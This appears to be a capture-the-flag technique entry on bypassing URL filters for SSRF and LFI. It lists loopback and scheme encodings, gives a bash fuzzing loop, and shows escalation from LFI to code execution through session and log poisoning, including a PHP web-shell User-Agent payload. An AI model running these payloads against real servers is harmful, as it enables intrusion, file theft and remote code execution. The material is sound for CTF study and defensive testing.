---
id: ssrf-lfi-filter-bypass
category: WEB
tags: [ssrf, lfi, filtro-de-url, file-wrapper, php-filter, ip-encoding, fuzzing, lfi-to-rce, session-poisoning, log-poisoning, path-traversal, rce]
tools: []
manuals: []
title: "SSRF/LFI: URL-filter bypass fuzzing"
difficulty: medium
created: 2026-09-03
updated: 2026-11-23
related: [xxe-external-entity-file-read, ssti-template-injection, php-object-injection-unserialize-pop-chain]
---

## How to recognize this pattern

- The app takes a URL/address via a parameter (a form field like `url`, `target`, `link`, `image`,
  `webhook`) and makes a request from the server (SSRF) or reads the content as a local file (LFI) to
  return/process it.
- Strong signal: there's some kind of visible validation/filter (it blocks `localhost`, `127.0.0.1`,
  literal `file://`), i.e. the dev tried to block the obvious, which suggests alternative
  representations of the same target get through.
- The challenge usually has a fixed target in mind: an internal endpoint (`/flag`, `/flag.txt`,
  `/admin`) or a sensitive local file.

## Method

**This is NOT a script to copy with the host/payload fixed from the previous challenge**. It's a
candidate-generation technique + test flow. Adapt the 3 blocks below to the current challenge (real
target, field name, flag format) before running.

### 1. Generate "internal address" candidates (IP/host blocklist bypass)

A filter that blocks the string `127.0.0.1`/`localhost` almost always forgets equivalent
representations of the same address:

- **Decimal:** `127.0.0.1` → `2130706433`
- **Octal:** `127.0.0.1` → `0177.0.0.1`
- **Hex:** `127.0.0.1` → `0x7f000001`
- **IPv6 loopback:** `[::1]`
- **Short form:** `127.1` (the OS still resolves it as `127.0.0.1`)
- **Bare `0`** (many OSes treat `0.0.0.0`/`0` as loopback in certain contexts)

### 2. Generate wrapper/protocol candidates (scheme blocklist bypass)

If the filter blocks the literal string `file://`:

- Case variation: `FILE://`, `fIlE://`
- Extra/missing slashes: `file:/x`, `file:////x`, `file:///./x`, `file:///../x`
- URL-encode the scheme itself: `%66%69%6c%65%3a///x` (single encode), or double-encode if the server
  decodes twice
- Alternative wrappers (if the stack is PHP and allows streams): `php://filter/convert.base64-encode/resource=<target>`,
  `expect://<command>`, `dict://<host>:<port>/<something>`, `zip://file.zip#internal`,
  `compress.zlib://<target>`

### 3. Automated test flow (adapt, don't copy literally)

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="<CHALLENGE_URL>"         # endpoint that takes the parameter
FIELD="<field_name>"             # url | target | link | image ...
FLAG_REGEX='<FLAG_PREFIX>\{[^}]*\}'   # e.g. something\{.*\}

# build the payload list by combining the two sections above
PAYLOADS=( "file:///flag.txt" "http://127.0.0.1/flag" "http://2130706433/flag" ... )

for p in "${PAYLOADS[@]}"; do
    resp=$(curl -s -m 15 -X POST "$TARGET" -d "${FIELD}=${p}")
    if echo "$resp" | grep -qoP "$FLAG_REGEX"; then
        echo "FLAG via payload '$p':"
        echo "$resp" | grep -oP "$FLAG_REGEX"
        break
    fi
    # if the response carries an embedded temporary link/URL (webhook pattern), follow it too:
    link=$(echo "$resp" | grep -oP 'https?://[0-9A-Za-z./:?=&_%#-]+' | head -n1 || true)
    [[ -n "$link" ]] && curl -s -m 15 "$link" | grep -oP "$FLAG_REGEX" && break
done
```

The key logic to preserve: **test in batch, stop at the first hit, follow intermediate links the
response might contain** (some challenges respond with a temporary URL/callback instead of the flag
directly).

### 4. Escalate a constrained LFI to RCE (when wrappers are filtered)

If `?page=`/`?file=` includes files but `php://`, `data://`, `http:` are blocked, you often can't read
what you want — but you **can include a file whose content you control**, and PHP will execute any
`<?php ?>` it finds inside, wherever that file came from.

**Session poisoning (no log path needed):** PHP writes each session to a predictable file. Get a value
you control stored in the session, then include that session file by path traversal:
```bash
B=https://target
# 1. poison: a param that lands in $_SESSION (here ?note=) carries PHP
curl -s -c j "$B/?note=%3C%3Fphp+system('cat+/flag.txt+2%3E/dev/null')%3B%3F%3E" >/dev/null
SID=$(grep -o 'PHPSESSID[[:space:]].*' j | awk '{print $NF}')
# 2. include the session file via traversal (common paths: /tmp/sess_<SID>, /var/lib/php/sessions/)
curl -s -b j "$B/?page=../../../tmp/sess_$SID"
```

**Log poisoning:** put PHP in a logged field (User-Agent is classic), then include the log:
```bash
curl -s "$B/" -A "<?php system(\$_GET['c']); ?>"
curl -s "$B/?page=../../../var/log/apache2/access.log&c=cat+/flag.txt"
# nginx: /var/log/nginx/access.log ; also /proc/self/environ (via UA), /var/log/auth.log (SSH user)
```

**`php://filter` RCE** (if the wrapper filter is incomplete): the `convert.base64`/`iconv` chain or the
`php_filter_chain_generator` can turn a pure read-only LFI into RCE without a writable file. Try it when
no session/log path is reachable.

## Gotchas

- Adjust `FLAG_REGEX` to the current CTF's real flag format before running, otherwise grep never
  matches even with the flag in the response.
- Test variations of the field name (`url`, `target`, `u`, `link`) if the obvious field does nothing;
  the payload list is only half the equation.
- If the stack isn't PHP, the `php://` wrappers make no sense; don't waste time on them.
- If nothing in the list works, consider that the filter may be blocking via a more aggressive regex
  (e.g. anything that isn't a "normal" domain); in that case the vector may be another one (DNS
  rebinding, redirect chain) outside the scope of this entry.

## Related / Cross-reference

- `xxe-external-entity-file-read`: XXE gives the same file-read / SSRF primitives via XML; pair the
  localhost-bypass list here with an XXE-as-SSRF payload.
- `php-object-injection-unserialize-pop-chain` / `ssti-template-injection`: alternative routes to RCE
  once a read primitive isn't enough.
- If the SSRF target is a custom (non-HTTP) service, see `custom-tcp-service-scripting` /
  `scapy-packet-crafting` in `Arsenal/NET/` for raw-socket interaction.
